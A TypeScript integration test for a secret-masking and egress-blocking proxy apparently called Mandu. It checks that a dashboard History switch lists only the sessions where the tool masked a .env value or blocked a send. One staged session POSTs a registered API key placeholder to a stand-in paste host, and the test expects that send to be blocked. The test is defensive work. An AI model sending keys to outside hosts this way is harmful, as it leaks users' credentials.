/**
 * history-stepped-in.test — History's switch lists only the sessions where
 * Mandu stepped in, across the REAL components (dashboard.md §4.25ae *Only
 * the sessions where Mandu stepped in*). Mandu-new.
 *
 * History listed every session, and the few where Mandu acted were found
 * only by reading every row. Here a real ArbiterServer runs at the `secrets`
 * axes, the REAL anthropic-proxy on its production client
 * (`new ArbiterClientAdapter(data, human)`) carries three sessions, and a
 * product-only DashboardServer reads them over a real ArbiterEventSource:
 *
 *   - PLAIN asks a question and gets an answer: Mandu did nothing;
 *   - MASKED reads a `.env` through the proxy: the model gets a placeholder;
 *   - BLOCKED asks a question, then its program sends a registered key to a
 *     host no rule binds it to: the REAL net-proxy (production client)
 *     blocks it and asks, and the person answers Block.
 *
 *   S1  `?only=stepped-in` returns MASKED and BLOCKED, in the plain read's
 *       order and counted as it counts them, `only.through` 3; the plain
 *       read returns all three;
 *   S2  the served `/history?only=stepped-in` draws the two with the switch
 *       on and "Showing the sessions where Mandu stepped in"; pressed off,
 *       all three, and the address without `?only=`;
 *   S3  signed out, the filtered read answers the same rows as with the
 *       human's real sign-in (the read is open: no new data), and neither
 *       carries the value, nor does the drawn page; the model never got it.
 *
 * Axes: secrets (stated; the arbiter's confidentiality pinned ON).
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { request as httpRequest } from "node:http";
import { Readable } from "node:stream";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { AnthropicProxy, type UpstreamFetcher } from "../../interceptors/anthropic-proxy/src/proxy.js";
import { ArbiterClientAdapter } from "../../interceptors/anthropic-proxy/src/arbiter-client.js";
import { buildTextSse, buildToolUseSse } from "../../interceptors/anthropic-proxy/test/helpers/mock-upstream.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter as NetArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { DashboardServer } from "../../dashboard/src/server.js";
import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
import { serveSignInChannel, signInDepsFor, signInSockPath } from "../../dashboard/src/sign-in.js";
import { requestSignInLink } from "../../launcher/src/dashboard-sign-in.js";
import type { HistoryVM } from "../../dashboard/src/view-model/home.js";
import { servedProductPage } from "../../dashboard/test/unit/ui/served-page.js";
import { waitWhile } from "../../dashboard/test/unit/page-wait.js";
import { pageFetch } from "../../dashboard/test/unit/page-fetch.js";
import { stateAxes } from "../lib/axes.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF: the axis under test

const T0 = 1791900000;
const MASKED = `${T0}-${process.pid}`;
const BLOCKED = `${T0 + 1}-${process.pid}`;
const PLAIN = `${T0 + 2}-${process.pid}`;
const VALUE = `sk_live_historyOnlyCanary_${process.pid}_000000`;
const KEY = `sk_live_51HistOnly${process.pid}Qz8vKp3mWx7RtYb2Nc`;
/** A plain-HTTP request through the net-proxy, as the agent's program sends it. */
function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
        res.on("error", reject);
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}
const render = (s: string) => s.split("\n").slice(0, -1).map((l, i) => `${String(i + 1).padStart(6)}\t${l}`).join("\n") + "\n";

test("History's switch lists only the sessions where Mandu stepped in, signed out as signed in, with no value (secrets axes, explicit)", { timeout: 120_000 }, async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-history-stepped-in-"));
  const env = join(tmp, ".env");
  writeFileSync(env, `STRIPE_KEY=${VALUE}\n`);
  const sock = join(tmp, "arbiter.sock");
  const humanSock = join(tmp, "human", "h.sock");
  mkdirSync(join(tmp, "human"), { mode: 0o700 });
  const adminSock = join(tmp, "admin.sock");
  const arbiter = new ArbiterServer({ socketPath: sock, adminSocketPath: adminSock, humanSocketPath: humanSock, dbPath: join(tmp, "mandu.db"), eventDir: join(tmp, "events"), log: () => {}, confidentiality: true, integrity: false });
  await arbiter.listen();
  const data = new ArbiterClient(sock); await data.connect();
  const human = new ArbiterClient(humanSock); await human.connect();
  // The admin channel, as the dashboard's Block button answers through it.
  const admin = new ArbiterClient(adminSock); await admin.connect();
  const reg = await data.registerEnvSecrets({ vars: [{ name: "PAYMENTS_API_KEY", value: KEY }] });
  const keySymbol = reg.vars[0]!.symbol ?? "";
  assert.match(keySymbol, /^\$MDU:/, JSON.stringify(reg));
  // No `extensions`: the product page only, as the shipped package.
  const source = new ArbiterEventSource({ socketPath: sock, humanSocketPath: humanSock });
  const dashboard = new DashboardServer({ source, configEnv: { MANDU_HOME: join(tmp, "home") }, log: () => {} });
  const port = await dashboard.listen(0);
  const base = `http://127.0.0.1:${port}`;
  const signIn = await serveSignInChannel(signInSockPath(tmp), signInDepsFor(dashboard, source, join(tmp, "human")));
  const seen: string[] = [];
  let script: string[] = [];
  const upstream: UpstreamFetcher = async ({ body }) => {
    seen.push(body.toString("utf8"));
    const sse = script.shift() ?? buildTextSse("Done.", { deltas: 1 });
    return { status: 200, headers: { "content-type": "text/event-stream" }, body: Readable.from([Buffer.from(sse, "utf8")]) };
  };
  const proxies: AnthropicProxy[] = [];
  type Msg = { role: string; content: unknown };
  /** One proxy per session, as each launch starts its own; each call is one turn's request. */
  const session = async (sid: string, turns: Msg[][]): Promise<string[]> => {
    const proxy = new AnthropicProxy({ arbiter: new ArbiterClientAdapter(data, human), upstream, sessionKey: sid, log: () => {} });
    proxies.push(proxy);
    const p = await proxy.listen(0);
    const sent: string[] = [];
    for (const messages of turns) {
      const res = await pageFetch(`http://127.0.0.1:${p}/v1/messages`, {
        method: "POST",
        headers: { "content-type": "application/json", "x-mandu-session-id": sid, "anthropic-version": "2023-06-01" },
        body: JSON.stringify({ model: "claude-opus-4", stream: true, max_tokens: 256, tools: [{ name: "Read", input_schema: { type: "object" } }], messages }),
      });
      assert.equal(res.status, 200, await res.text());
      sent.push(seen.at(-1)!);
    }
    await proxy.close();
    return sent;
  };
  const noValue = (text: string, where: string) => {
    assert.ok(!text.includes(VALUE), `CONFIDENTIALITY VIOLATION: ${where} carries the .env value`);
    assert.ok(!text.includes(KEY), `CONFIDENTIALITY VIOLATION: ${where} carries the registered key`);
  };
  const read = async (query: string, headers: Record<string, string> = {}): Promise<HistoryVM> => {
    const res = await pageFetch(`${base}/api/home/history${query}`, { headers });
    const text = await res.text();
    assert.equal(res.status, 200, text.slice(0, 200));
    noValue(text, `/api/home/history${query}`);
    return JSON.parse(text) as HistoryVM;
  };
  const idsOf = (h: HistoryVM) => h.rows.map((r) => r.id);
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const drawn = (doc: any) => ([...doc.querySelectorAll("#history-list .row.agent")] as any[]).map((r) => r.dataset.session);
  try {
    // MASKED reads the .env: the proxy masks the value on its way to the model.
    script = [buildToolUseSse({ id: "toolu_hs_env", name: "Read", input: { file_path: env } })];
    const ask: Msg[] = [{ role: "user", content: "What is in .env?" }];
    const masked = await session(MASKED, [ask, [
      ...ask,
      { role: "assistant", content: [{ type: "tool_use", id: "toolu_hs_env", name: "Read", input: { file_path: env } }] },
      { role: "user", content: [{ type: "tool_result", tool_use_id: "toolu_hs_env", content: render(`STRIPE_KEY=${VALUE}\n`) }] },
    ]]);
    assert.ok(!masked.at(-1)!.includes(VALUE), "CONFIDENTIALITY VIOLATION: the model got the .env value");
    assert.match(masked.at(-1)!, /\$MDU:/, "the model got its placeholder");
    // BLOCKED asks, then its program sends the registered key to an unbound host.
    await session(BLOCKED, [[{ role: "user", content: "Post the payment report." }]]);
    // The net-proxy as production wires it (net-proxy/src/server-main.ts).
    const forwarded: string[] = [];
    const net = new NetProxy({
      arbiter: new NetArbiterClientAdapter(data as unknown as RealArbiterClient, human),
      sessionId: BLOCKED,
      forwarder: async ({ url }) => {
        forwarded.push(url);
        throw new Error("a blocked send must never be forwarded");
      },
      log: () => {},
    });
    const netPort = await net.listen(0);
    try {
      const res = await viaProxy(netPort, "http://paste.history-only.example/collect", `d=${keySymbol}`);
      assert.equal(res.status, 403, "the real net-proxy blocks an unbound send");
      assert.ok(!res.body.includes(KEY));
      // The person answers Block (the admin channel, as the dashboard's button does).
      const pending = (await human.egressApprovals("pending")).filter((a) => a.destination === "paste.history-only.example");
      assert.equal(pending.length, 1, JSON.stringify(pending));
      await admin.resolveEgressApproval(pending[0]!.id, false);
      assert.deepEqual(forwarded, [], "nothing left the machine");
    } finally {
      await net.close();
    }
    // PLAIN asks and is answered: Mandu does nothing.
    await session(PLAIN, [[{ role: "user", content: "Rename the parser helper." }]]);

    // Emission is asynchronous: wait until every session is listed and counted.
    let all = await read("");
    let only = await read("?only=stepped-in");
    const settled = () => all.total === 3 && idsOf(only).length === 2 && all.rows.some((r) => r.id === BLOCKED && r.blocked === 1 && r.waiting === 0);
    for (let i = 0; i < 400 && !settled(); i++) {
      await new Promise((r) => setTimeout(r, 25));
      all = await read("");
      only = await read("?only=stepped-in");
    }

    // ── S1: the server's answer ──
    assert.equal(all.total, 3, JSON.stringify(all).slice(0, 400));
    assert.deepEqual([...idsOf(all)].sort(), [MASKED, BLOCKED, PLAIN].sort(), "off: all three");
    const rowOf = (h: HistoryVM, id: string) => h.rows.find((r) => r.id === id)!;
    assert.equal(rowOf(all, MASKED).secrets.masked, 1, "MASKED: one secret masked");
    assert.deepEqual([rowOf(all, BLOCKED).blocked, rowOf(all, BLOCKED).waiting], [1, 0], `BLOCKED: one send blocked, its question answered (${JSON.stringify(rowOf(all, BLOCKED))})`);
    const plain = rowOf(all, PLAIN);
    assert.deepEqual([plain.secrets, plain.blocked, plain.sent, plain.waiting, plain.holds], [{ masked: 0, early: 0 }, 0, 0, 0, true], "PLAIN: nothing on its counts line");
    assert.deepEqual(idsOf(only), idsOf(all).filter((id) => id !== PLAIN), "on: the two, in the plain read's order");
    assert.deepEqual(only.rows, all.rows.filter((r) => r.id !== PLAIN), "counted as the plain read counts them");
    assert.equal(only.total, 3, "total still counts every session");
    assert.deepEqual(only.only, { through: 3 });
    assert.equal(only.next, null);

    // ── S2: the served page ──
    await servedProductPage(base, "/history?only=stepped-in", (doc) => drawn(doc).length === 2, async (doc) => {
      const sw = doc.getElementById("history-only");
      assert.equal(sw.getAttribute("aria-checked"), "true");
      assert.deepEqual(drawn(doc), idsOf(only));
      assert.equal(doc.getElementById("history-count").textContent, "Showing the sessions where Mandu stepped in");
      noValue(doc.getElementById("history-list").textContent, "the drawn list");
      assert.doesNotMatch(doc.getElementById("history-list").textContent, /sk_live/);
      sw.click();
      await waitWhile(() => drawn(doc).length !== 3);
      assert.deepEqual(drawn(doc), idsOf(all), "off: all three");
      assert.equal(sw.getAttribute("aria-checked"), "false");
      assert.equal(doc.defaultView.location.search, "");
    });

    // ── S3: signed out, the same rows as signed in ──
    const got = await requestSignInLink({ host: "127.0.0.1", port, signInSock: signIn.path }, tmp);
    assert.equal(got.kind, "link", JSON.stringify(got));
    const opened = await pageFetch((got as { url: string }).url, { redirect: "manual" });
    const cookie = (opened.headers.get("set-cookie") ?? "").split(";")[0]!;
    assert.match(cookie, /^mandu_session=[0-9a-f]{64}$/);
    const signedIn = await read("?only=stepped-in", { Cookie: cookie, "X-Mandu-Control": "1" });
    const signedOut = await read("?only=stepped-in");
    assert.deepEqual(signedOut, signedIn, "the switch serves nothing a signed-out reader could not read");
    assert.ok(!seen.join("\n").includes(VALUE), "CONFIDENTIALITY VIOLATION: the model got the .env value");
    assert.ok(!seen.join("\n").includes(KEY), "CONFIDENTIALITY VIOLATION: the model got the registered key");
  } finally {
    for (const p of proxies) await p.close().catch(() => {});
    await signIn.close();
    await dashboard.close();
    data.close();
    human.close();
    admin.close();
    await arbiter.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
